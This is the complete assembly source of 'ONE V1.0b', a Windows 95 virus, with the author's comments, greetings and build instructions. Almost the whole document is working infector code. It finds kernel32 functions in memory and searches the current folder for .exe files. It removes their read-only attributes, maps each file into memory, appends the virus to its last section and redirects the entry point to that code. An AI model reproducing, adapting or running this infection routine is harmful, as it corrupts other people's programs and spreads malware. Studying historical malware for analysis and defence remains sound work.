
;                      ONE V1.0b By JFK/SGWW
;
;
; ONE is not only my first Win95 virus, but also my first virus
; which I have released. I'm not really all that proud of it, 
; cause it didn't turn out at all to be what I had expected. But hey, 
; maybe next time :) Hmmm, this virus really has no chance of 
; spreading because it never moves out of its current directory.
; It's more or less just a learning experience.
;
; Features:
;   * File Mapping (though it's sorta pointless because off all
;                    the normal reads)
;   * Capable of infecting read only files.
;   * Only increases a files size if it has to.
;   * LOTS O' COMMENTS!!!! :-)
;
; Description:
;    One will look in the current directory for *.exe files until
;    it finds one that it should/can infect or until there are no
;    more exe files. When a exe file is found, One reads in the PE
;    header, and object table. One closes the file and looks for 
;    the next exe file if it determines the current file has already
;    been infected. If the file has not been infected, One figures
;    out all the new sizes of objects and stuff like that for the
;    host. One then maps the file to memory, fills in the new PE
;    header, object table, and appends the virus code to the end of
;    the last object. One then unmaps the file, and closes it which
;    automatically saves the changes made while mapped. One then 
;    starts all over looking for more *.exe files, if one is not found,
;    control is given to the host's original entry point.
;
; Notes:
;    * ONE will NOT work on WinNT
;    * First generations crash. (because OldEA is 0)
;    * Some code was taken from Mr. Klunky by DV8 and Yurn by Virogen.
;
; Greetz:
;    Dakota: Your web page looks pretty nice!
;    #virus & #vir (undernet): hiya :)
;    SGWW: Thanx for accepting me as one of you.
;    paw: Watch out pal, I've been practicing my trivia!
;    RAiD: alt.comp.virus.raid-vs-avers??? :)
;    Yesna: Did you forget your password on X? You never have ops! =)
;    Opic: Did you find any good BBS's yet!?!? heheh
;    LovinGod: You need a book on winsock bro! ;)
;    Virogen: Ok, so this is not exactly the kernel infector I was talking about.
;    Gloomy: ne ebi mozgi! :))))
;
; Assemble with:
;  tasm32 -ml -m5 -q -zn one.asm
;  tlink32 -Tpe -c -x -aa one,,, import32
;  pewrsec one.exe

.386p
.model  flat

include Win32API.inc

v_size     equ v_end - v_start        ;Virus absolute size in filez.


extrn      ExitProcess         :proc

.data
           db    ?                    ;Some dummy data so tlink32 dont yell.

.code
v_start:
           push  eax                        ;Save room for old Entry Point.
           pushad                           ;Save registers.
           add   esp, 36d                   ;ESP->After saved registers+4.

           call  OldTrick                   ;Get delta offset.
OldTrick:  pop   ebp
           sub   ebp, offset OldTrick       ;EBP = delta offset.
  
           mov   eax, [ebp+OldEA]           ;Address for return.
           push  eax                        ;Save it.
           sub   esp, 32d                   ;Fix stack.

           mov   eax, 15d
           mov   [ebp+lpfGetProcAddress], eax

findK32PEHeader:
           mov   edi, 0BFF6FFFFh            ;Will be inc'ed later
           mov   ecx, 00000300h             ;Scan this many bytes.
           mov   eax, 00004550h             ;Scan for "PE\0\0".

F_PE_I_Edi:
           inc   edi
Find_PE:
           repne scasb                    ;Repeat while not equal, scan byte.
           jne   RestoreHost                ;Bomb if not found.

           cmp   [edi-1], eax               ;Is this dword "PE/0/0"?
           jne   Find_PE                    ;Nope, continue scanning.
    
           dec   edi                        ;EDI was +1 off from Repne Scasb
           mov   bx, word ptr [edi+16h]     ;Get characteristics word.
           and   bx, 0F000h                 ;Unmask the bytes we need.
           cmp   bx, 2000h                  ;Is it 2000h (a DLL)?
           jne   F_PE_I_Edi        ;It's not a Dll, so it cant be the Kernel.

           mov   eax, [edi+34h]       ;EAX = Image Base (or Image Handle)
           mov   [ebp+K32Base], eax   ;Save Image base.
           mov   ebx, [edi+78h]       ;Get RVA of Export Table.
           add   ebx, [ebp+K32Base]   ;Add Base Address.
           mov   edi, [ebx+20h]       ;EDI=RVA Export Name Table Pointers.
           add   edi, [ebp+K32Base]   ;Add Base Address.

          ;Determine offset for unnamed functions.
           mov   ecx, [ebx+14h]             ;Number of functions...
           sub   ecx, [ebx+18h]             ;...less number of names...
           mov   eax, 4                     ;...times by four.
           mul   ecx                        ;Do it.
           mov   [ebp+UnnamedOffset], eax ;Save it.

          ;Calculate number of double words in string pointer array.
           mov   ecx, [ebx+18h]             ;Number of names...
           mov   eax, 4                     ;...times by four.
           mul   ecx                        ;Do it.
           xchg  ecx, eax                   ;CX=Num dwords.

           mov   edx, edi             ;Mul fucked up EDX,EDX=start of array.
                                       
CheckFunctionName:                      
           sub   ecx, 4                     ;Next name.
           mov   edi, edx                   ;Base address...
           add   edi, ecx                   ;...plus array index.
           mov   edi, [edi]                 ;Get RVA of name.
           add   edi, [ebp+K32Base]         ;Add base address.
                                              
           lea   esi, [ebp+lpfGetProcAddress]   ;GetProcAddress record.
           lea   eax, [ebp+lpfGetProcAddress]   ;Save entry point here.
           call  ExtractAbsoluteAddress     ;Check this name for it.
 
           cmp   ecx, 0                     ;Checked all the names?
           jne   CheckFunctionName          ;Nope. Check the next name.

           cmp   [ebp+lpfGetProcAddress], 00h   ;Did we get it?
           je    RestoreHost                ;Nope! :(
           
          ;Get all of our needed API offsets from memory.
           lea   esi, [ebp+ImportTable]     ;Start of stucture for offsets.
           mov   edx, esi                   ;Same.
GFO_NextChar:
           mov   bl,  [edx]                 ;bl = next char in table.
           cmp   bl,  0                     ;Is it 0?
           je    GFO_ItsZero                ;Yeah.
           cmp   bl,  '-'                   ;Is it the end of the table?
           je    After_GFO                  ;Yeah, continue.
           inc   edx                        ;Next char.
           jmp   GFO_NextChar               ;Loop.
GFO_ItsZero:
           inc   edx                        ;EDX -> where offset will go.
           mov   eax, esi                   ;EAX -> function name.
           push  edx                        ;Save EDX.
           call  MyGetProcAddress           ;Get this function's offset.
           jc    RestoreHost                ;Quit on fail.
           pop   edx                        ;Restore EDX.
           mov   [edx], eax                 ;Save offset.
           add   edx, 4                     ;EDX -> next functions name.
           mov   bl,  [edx]                 ;BL = first char of name.
           cmp   bl,  '-'                   ;Are we done yet?
           je    After_GFO                  ;Yep.
           mov   esi, edx                   ;ESI -> Next functions name.
           inc   edx                        ;Check next char.
           jmp   GFO_NextChar               ;Do it.
After_GFO:

          ;Look for FIRST *.exe file.
           lea   eax, [ebp+FoundFileData]   ;Where to store results.
           push  eax
           lea   eax, [ebp+lpsExeFiles]     ;Name of files to look for.
           push  eax
           call  [ebp+lpfFindFirstFileA]    ;Direct API call.
;On return, if a file with the name is found, eax = the handle,
;otherwise eax=FFFFFFFF
           cmp   eax, 0FFFFFFFFh            ;No file found?
           je    RestoreHost                ;No more exe files in this folder.
           mov   [ebp+FoundFileHandle], eax ;Save handle.

MainLoop:  
           call  ReadInPEHeader             ;Read in the files PE header.
           cmp   ebx, 0                     ;Did we fail?
           je    FindNextFile               ;Next file on failure.

           call  SetNOAttribs               ;Remove files attributes.
           jc    FindNextFile               ;Couldnt set attributes.

           call  OpenFile                   ;Open the file.
           jc    FindNextFile               ;Couldnt open file.

           call  MapFile                    ;Map this file into memory
           jc    MapFailed                  ;Couldn't map file.

           call  InfectFile                 ;Infect it.

           push  dword ptr [ebp+MapBaseAddr]
           call  [ebp+lpfUnmapViewOfFile]   ;Unmap this file from memory.

MapFailed:
           call  CloseFile                  ;Close the file.

           call  RestoreAttribs             ;Restore the original attributes.
          

FindNextFile:
           lea   eax, [ebp+FoundFileData]   ;Where to store results.
           push  eax
           push  dword ptr [ebp + offset FoundFileHandle] 
                                            ;Handle from previous searches.
           call  [ebp+lpfFindNextFileA]     ;Do it.
           or    eax, eax                   ;Success?
           jnz   MainLoop                   ;Yes, Continue search.

RestoreHost:          
           popad
           ret

;***********************
;****** Functions ******
;***********************

;**** InfectFile ****

InfectFile PROC
          ;Append virus code to end of last object.
           mov   edx, [ebp+OldPhysSize]       ;Physical size of object.
           add   edx, [esi+20d]               ;Physical offset of object.
           add   edx, [ebp+MapBaseAddr]       ;Plus of mapped object.
   
           lea   eax, v_start                 ;EAX = start of virus.
           add   eax, ebp                     ;Plus delta offset.

           mov   ecx, v_size                  ;Number of bytes to write.
           call  WriteMem                     ;write it.

          ;Write new object table to host.
           mov   eax, [ebp+MapBaseAddr]       ;EAX -> base of mapped object.
           add   eax, 3Ch                     ;Offset of -> to PE header.
           mov   eax, [eax]                   ;EAX -> PE header
           add   eax, [ebp+MapBaseAddr]       ;Add base of mapped object.
           add   eax, 18h                     ;EAX -> AFTER flags field.
           xor   edx, edx                     ;EDX = 0h
           mov   dx,  [ebp+NT_HDR_Size]       ;EDX = Size of header.
           add   edx, eax

           lea   eax, ObjectTable             ;EAX -> new object table.
           add   eax, ebp                     ;Add delta offset.

           mov   ecx, 240d                    ;Size of new object table.
           call  WriteMem                     ;Write it.

          ;Write new PE header to host.
           mov   edx, [ebp+MapBaseAddr]       ;EDX -> base of mapped object.
           add   edx, 3Ch                     ;Offset of -> to PE header.
           mov   edx, [edx]                   ;EDX -> PE header
           add   edx, [ebp+MapBaseAddr]       ;Add base of mapped object.

           lea   eax, PE_Header              ;EAX = offset of new PE header.
           add   eax, ebp                    ;Plus delta offset.

           mov   ecx, 54h                    ;Size of new PE header.
           call  WriteMem                    ;Write it.

           ret
InfectFile ENDP

;**** WriteMem ****

WriteMem PROC
WM_NextByte:
         mov  bl, [eax]                       ;Byte from virus.
         mov  [edx], bl                       ;Write to host.
         dec  ecx                             ;One less byte to write.
         inc  eax                             ;Next virus byte.
         inc  edx                             ;Next target byte.
         cmp  ecx, 0                          ;Did we write the whole virus?
         jne  WM_NextByte                     ;Nope, do next byte.
         ret
WriteMem ENDP

;**** ReadInPEHeader ****

ReadInPEHeader PROC
           call SetNOAttribs                  ;Needed for OpenFile.
           jc   RIPH_Failed                   ;Couldnt remove attributes.
           call OpenFile                      ;Open the file.
           jc   RIPH_Failed                   ;Couldnt open this file.

          ;Move file pointer to where the offset to PE should be.
           push  0                            ;FILE_BEGIN = 00000000h
           push  0                            ;High order 32 bits to move.
           mov   eax, 3Ch                     ;-> offset of PE header.
           push  eax
           push  dword ptr [ebp+OpenFileHandle]  ;File to fuck with.
           call  [ebp+lpfSetFilePointer]      ;Set the file pointer.

          ;Read in offset of PE header in file.
           push  0
           lea   eax, [ebp+FileBytesRead]     ;Place to store # of bytes read.
           push  eax
           push  4                            ;# of bytes to read.
           lea   eax, [ebp+DataFromFile]      ;Buffer for read.
           push  eax
           push  dword ptr [ebp+OpenFileHandle]       ;File to read from.
           call  [ebp+lpfReadFile]            ;Read from file.

          ;Move the file pointer to the PE header.
           push  0                            ;FILE_BEGIN = 00000000h
           push  0                            ;High order 32 bits of move.
           mov   eax, [ebp+DataFromFile]      ;Offset of PE header.
           push  eax
           push  dword ptr [ebp+OpenFileHandle] ;File to fuck with.
           call  [ebp+lpfSetFilePointer]        ;Set the file pointer.

          ;Read in the PE header.
           push  0
           lea   eax, [ebp+FileBytesRead]     ;Place to store # of bytes read.
           push  eax
           push  54h                          ;# of bytes to read.
           lea   eax, [ebp+PE_Header]         ;Buffer for read.
           push  eax
           push  dword ptr [ebp+OpenFileHandle]       ;File to read from.
           call  [ebp+lpfReadFile]            ;Read from file.

          ;Do some checks.
           mov   eax, [ebp+FileBytesRead]     ;# of bytes read.
           cmp   eax, 54h                     ;Did we read in enough?
           jne   RIPH_Failed                  ;Nope.
           mov   eax, [ebp+Reserved9]         ;EAX = infection marker.
           cmp   eax, 0h                      ;Is it infected already?
           jne   RIPH_Failed                  ;Yes.
           mov   ax,  word ptr [ebp+Sig_Bytes]        ;PE signature.
           cmp   ax,  'EP'                    ;Is this a PE file?
           jne   RIPH_Failed                  ;Nope.
           mov   ax,  [ebp+NumbOfObjects]     ;Number of objects in file.
           cmp   ax,  6                       ;Too many objects?
           ja    RIPH_Failed                  ;Yep

          ;Move file pointer to object table in file.
           push  0                            ;FILE_BEGIN = 00000000h
           push  0                            ;High order 32 bits of move.
           xor   eax, eax
           mov   ax,  [ebp+NT_HDR_Size]       ;NT header size.
           add   eax, [ebp+DataFromFile]      ;Plus offset to PE header.
           add   eax, 18h                     ;AFTER flags field in header.
           push  eax
           push  dword ptr [ebp+OpenFileHandle] ;File to fuck with.
           call  [ebp+lpfSetFilePointer]      ;Set the file pointer.

          ;Read in object table.
           push  0
           lea   eax, [ebp+FileBytesRead]     ;Place to store # of bytes read.
           push  eax
           push  240d                         ;# of bytes to read.
           lea   eax, [ebp+ObjectTable]       ;Buffer for read.
           push  eax
           push  dword ptr [ebp+OpenFileHandle]       ;File to read from.
           call  [ebp+lpfReadFile]                    ;Read from file.

          ;Do some checks.
           mov   eax, [ebp+FileBytesRead]     ;# of bytes read.
           cmp   eax, 240d                    ;Did we read enough?
           jne   RIPH_Failed                  ;Nope.

          ;Save Original entry point.
           mov   eax, [ebp+ImageBase]         ;Files base address
           add   eax, [ebp+EntryPointRVA]     ;Plus entrypoint RVA.
           mov   [ebp+OldEA], eax             ;Save it.

          ;** Figure out sizes for object and size of file **

          ;Get offset to DATA of the object we will infect.
           xor   eax, eax
           mov   ax, [ebp+NumbOfObjects]      ;Number of objects.
           dec   eax                          ;We want last object.
           mov   ecx, 40                      ;Each object 40 bytes
           xor   edx, edx
           mul   ecx                          ;#OfObj-1*40=last object.
           lea   esi, [ebp+ObjectTable]       ;ESI -> object table.
           add   esi, eax                     ;ESI = ptr to last Object Entry.

          ;Set new physical size for object.
           mov   ecx, dword ptr [ebp+FileAlign] ;Get file alignment.
           mov   eax, [esi+16d]               ;Get physical size of object.
           mov   [ebp+OldPhysSize], eax       ;Save it.
           push  eax                       ;Save for figuring new entry point.
           add   eax, v_size                  ;Size of virus.
           call  AlignFix                     ;Figure new size.
           mov   dword ptr [esi+16d], eax     ;Set new physical size.

          ;Set new virtual size for object.
           mov   ecx, dword ptr [ebp+ObjectAlign] ;Get object alignment.
           push  ecx                          ;Save for below.
           mov   eax, [esi+8]                 ;Get object virtual size.
           add   eax, v_size                  ;Add our virtual size.
           call  AlignFix                     ;Set on obj alignment.
           mov   dword ptr [esi+8], eax       ;Set new virtual size.

           mov   [esi+36d], 0C0000040h        ; set object flags

          ;Set new image size.
           pop   ecx                          ;ECX = object alignment vlaue.
           mov   eax, v_size                  ;EAX = size of virus.
           add   eax, dword ptr [ebp+ImageSize] ;add to old image size
           call  AlignFix                     ;Figure new size.
           mov   [ebp+ImageSize], eax         ;Set new ImageSize.

          ;Set new entrypoint.
           pop   eax                  ;EAX = physical size of infected object.
           add   eax, [esi+12d]               ;Add objects RVA.
           mov   [ebp+EntryPointRVA], eax     ;Set new entrypoint.

          ;** Figure new physical size for mapping. **

          ;Get files size.
           push  0
           push  dword ptr [ebp+OpenFileHandle] ;Handle of file.
           call  [ebp+lpfGetFileSize]         ;Get the files size in bytes.
           mov   [ebp+SizeOfHost], eax        ;Save size.
           mov   [ebp+Reserved9], eax         ;Mark as infected.

          ;Figure new size.
           mov   ebx, [esi+16d]               ;Object physical size.
           add   ebx, [esi+20d]               ;Add physical offset of object.
           cmp   ebx, eax                     ;Which is larger?
           ja    RIPH_NewSize                 ;File size should be larger.

           jmp   RIPH_Done                    ;Return success.

RIPH_NewSize:
           mov   ecx, [ebp+FileAlign]         ;File align value
           mov   eax, ebx                     ;Size now.
           call  AlignFix                     ;Figure new size.
           mov   [ebp+SizeOfHost], eax        ;Save new size.
           jmp   RIPH_Done

RIPH_Failed:
           xor   ebx, ebx                     ;Mark failure.
 
RIPH_Done:
           call CloseFile                     ;Close the file.
           call RestoreAttribs                ;Restore its attributes.
           ret
ReadInPEHeader ENDP

;**** SetNOAttribs ****
;This function first saves a files attributes to OrigFileAttribs,
;then sets the files attributes to "normal" so that the file can
;be written to. On errors, the carry flag is set.

SetNOAttribs PROC
          ;Get the files attributes.
           lea   eax, [ebp+FoundFileData.WFD_szFileName] 
           push  eax                          ;Push found files name.
           call  [ebp+lpfGetFileAttributesA]
           mov   [ebp+OrigFileAttribs], eax   ;Save original file attribs.

          ;Set file attributes to none so we can write to it if needed.
           mov   eax, FILE_ATTRIBUTE_NORMAL   ;Give the file "normal" attribs
           push  eax
           lea   eax, [ebp+FoundFileData.WFD_szFileName]
           push  eax                          ;Push files name to stack.
           call  [ebp+lpfSetFileAttributesA]  ;Set the attributes.
           ret
SetNOAttribs ENDP

;**** MapFile ****
;This proc gets a files(file in FileFoundData) size, creates a mapped 
;object of the size needed, then maps the file into the object created.
;Carry flag is set on errors.

MapFile PROC

          ;Create File mapping object.
           push  0                            ;Dont need a name.
           mov   eax, [ebp+SizeOfHost]        ;Size of object.
           push  eax
           push  0                            ;Not used.
           push  PAGE_READWRITE               ;We need read+write access.
           push  0                            ;Default security.
           push  dword ptr [ebp+OpenFileHandle] ;OPEN file handle.
           call  [ebp+lpfCreateFileMappingA]  ;Create the mapped object.
           cmp   eax, 0                       ;Did we fail?
           je    OF_Failed                    ;Yep.
           mov   [ebp+MappedObjectHandle], eax ;Save handle to mapped object.

          ;Map file into object.
           push  0                            ;Map WHOLE file.
          ;Offsets are not needed cause we're gonna start mapping at the 
          ;beginning of the file.          
           push  0                            ;Low order 32 bits of offset.
           push  0                            ;High order 32 bits of offset.
           push  FILE_MAP_WRITE               ;We need Read+Write access.
           push  eax                          ;Handle of mapping object.
           call  [ebp+lpfMapViewOfFile]       ;Map the file
;Dont ask me why, but this returns some fucked up handle
;to memory that doesnt appear to exist, and the file doesnt
;seem to be read into memory until this memory is actually 
;accessed(which magically does NOT cause a page fault)! 
;weird! (I could be wrong, maybe just my debugger...)
           mov   [ebp+MapBaseAddr], eax       ;Save base Address.
           cmp   eax, 0                       ;Did we fail?
           jne   MP_Success                   ;We succeeded
           stc
MP_Success:
           ret
MapFile ENDP

;**** RestoreAttribs ****
;This proc restores the attributes of the file pointed to by
;FoundFileData. CarryFlag is NOT set on errors.

RestoreAttribs PROC
          ;Restore file attributes.
           mov   eax, [ebp+OrigFileAttribs]   ;The files original attribs
           push  eax
           lea   eax, [ebp+FoundFileData.WFD_szFileName] 
           push  eax                          ;Push found files name.
           call  [ebp+lpfSetFileAttributesA]  ;Set the attributes.
           ret
RestoreAttribs ENDP

;**** OpenFile ****
;This proc just opens the file pointed to in FoundFileData.
;If successful, the OPEN files handle is put into OpenFileHandle.
;If errors happen, the carry flag is set.

OpenFile PROC
          ;Open the file.
           push  0
           push  FILE_ATTRIBUTE_NORMAL
           push  OPEN_EXISTING                       
           push  0
           push  0                            ;0=Request exclusive access
           push  GENERIC_READ + GENERIC_WRITE
           lea   eax, [ebp+FoundFileData.WFD_szFileName]
           push  eax                          ;Push files name on stack.
           call  [ebp+lpfCreateFileA]         ;Open file.
           cmp   eax, 0FFFFFFFFh              ;Did we fail?
           je    OF_Failed                    ;Jeah, we failed. (SETS CARRY)
           mov   [ebp+OpenFileHandle], eax    ;Save handle of OPEN file.
           clc                                ;Clear carry flag (no errors)
           ret
OF_Failed:
           stc                                ;Set carry flag.
           ret
OpenFile ENDP

;**** CloseFile ****
;This proc just closes the file pointed to by OpenFileHandle.
;Carry flag is NOT set if errors occur.(what for?)

CloseFile PROC
          ;Close the file.
           push  dword ptr [ebp+OpenFileHandle]   ;Handle of opened file.
           call  [ebp+lpfCloseHandle]         ;Close it
           ret
CloseFile ENDP

;**** AlignFix ****

AlignFix PROC
           xor   edx, edx
           div   ecx                          ;/alignment
           inc   eax                          ;next alignment
           mul   ecx                          ;*alignment
           ret
AlignFix ENDP

;**** ExtractAbsoluteAddress ****

ExtractAbsoluteAddress PROC
           pushad                           ;Save everything.

           mov   ecx, [esi]                 ;Get string length.
           add   esi, 4                     ;Point to string
           rep   cmpsb                      ;Check the string.

           popad                            ;Restore everything.
           jne   EAA_NotString              ;This isn't the string - exit.

           xchg  esi, eax                   ;ESI = dword for address.

           mov   eax, [ebx+1Ch]             ;RVA of Function Address array.
           add   eax, [ebp+UnnamedOffset]   ;Plus unused function names.
           add   eax, [ebp+K32Base]         ;Plus DLL load address.
           add   eax, ecx                   ;Plus array offset.
           mov   eax, [eax]                 ;Get the address.
           add   eax, [ebp+K32Base]         ;Plus DLL load address.

           mov   [esi], eax                 ;Save the address.

EAA_NotString:
           ret
ExtractAbsoluteAddress ENDP

;**** MyGetProcAddress ****

MyGetProcAddress PROC
           push  eax                        ;lpProcName.
           mov   eax, [ebp+ModHandle]       ;< hModule.
           push  eax                        ;<
           call  [ebp+lpfGetProcAddress]    ;Call GetProcAddress directly.
                                            
           cmp   eax, 0                     ;EAX = 0?
           jne   MyGetProcDone              ;Nope, success.

           stc                              ;Failure.

MyGetProcDone:
           ret
MyGetProcAddress ENDP


; ******  DATA ******

K32Base            dd  0                    ;Start of K32 in memory.
UnnamedOffset      dd  0
ModHandle          dd  0BFF70000h           ;Used with calls to MyGetProcAddr.
lpfGetProcAddress  dd  15d                  ;Crap for finding GetProcAddress.
                   db  "GetProcAddress",0
FoundFileData      WIN32_FIND_DATA   ?      ;Crap used for finding files.
lpsExeFiles        db '*.exe',0
OldEA              dd  0                    ;Original Entry Point(NOT RVA)
OldPhysSize        dd  0                    ;Old physical size of last object.
FoundFileHandle    dd  0                    ;Spot for handle of found files.
OpenFileHandle     dd  0                    ;Spot for handle of open files.
MappedObjectHandle dd  0                    ;Handle of mapped object.
OrigFileAttribs    dd  0                    ;Spot for file attributes.
DataFromFile       dd  0                    ;Data read from file.
FileBytesRead      dd  0                    ;Number of bytes read.
MapBaseAddr        dd  0                    ;Base address of mapped object.
SizeOfHost         dd  0                    ;Size needed for mapped object.

PE_Header:                                  ;Buffer for PE header.
Sig_Bytes:         dd  0
CPU_Type:          dw  0
NumbOfObjects      dw  0
TimeStamp          dd  0
Reserved1          dd  0
Reserved2          dd  0
NT_HDR_Size        dw  0
Flags              dw  0
Reserved3          dw  0
LMajor             db  0
LMinor             db  0
Reserved4          dd  0
Reserved5          dd  0
Reserved6          dd  0
EntryPointRVA      dd  0
Reserved7          dd  0
Reserved8          dd  0
ImageBase          dd  0
ObjectAlign        dd  0
FileAlign          dd  0
OS_Major           dw  0
OS_Minor           dw  0
UserMajor          dw  0
UserMinor          dw  0
SubSysMajor        dw  0
SubSysMinor        dw  0
Reserved9          dd  0
ImageSize          dd  0                   ;54h bytes.

ObjectTable:       db  240d dup (0)        ;Room for 6 object entries.

ImportTable:                                ; :-)
                          db  'FindFirstFileA',0
lpfFindFirstFileA         dd  0
                          db  'FindNextFileA',0
lpfFindNextFileA          dd  0
                          db  'GetFileAttributesA',0
lpfGetFileAttributesA     dd  0
                          db  'SetFileAttributesA',0
lpfSetFileAttributesA     dd  0
                          db  'CreateFileA',0
lpfCreateFileA            dd  0
                          db  'SetFilePointer',0
lpfSetFilePointer         dd  0
                          db  'ReadFile',0
lpfReadFile               dd  0
                          db  'GetFileSize',0
lpfGetFileSize            dd  0
                          db  'CreateFileMappingA',0
lpfCreateFileMappingA     dd  0
                          db  'MapViewOfFile',0
lpfMapViewOfFile          dd  0
                          db  'UnmapViewOfFile',0
lpfUnmapViewOfFile        dd  0
                          db  'CloseHandle',0
lpfCloseHandle            dd  0

lpsSig                    db  '-=[ONE V1.0b by JFK/SGWW]=-' 

v_end:
           end   v_start